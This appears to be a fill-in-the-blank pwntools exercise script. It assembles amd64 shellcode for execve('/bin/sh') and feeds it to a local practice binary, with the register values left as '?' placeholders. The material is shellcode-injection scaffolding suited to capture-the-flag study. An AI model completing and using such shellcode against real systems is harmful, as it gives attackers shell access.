from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# execve("/bin/sh", 0, 0)
shellcode = asm("""
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rax, ?
    mov rdi, ?
    mov rsi, ?
    mov rdx, ?
    syscall
""")

r = process('./shellcode')

r.sendlineafter(b'> ', shellcode)

r.interactive()
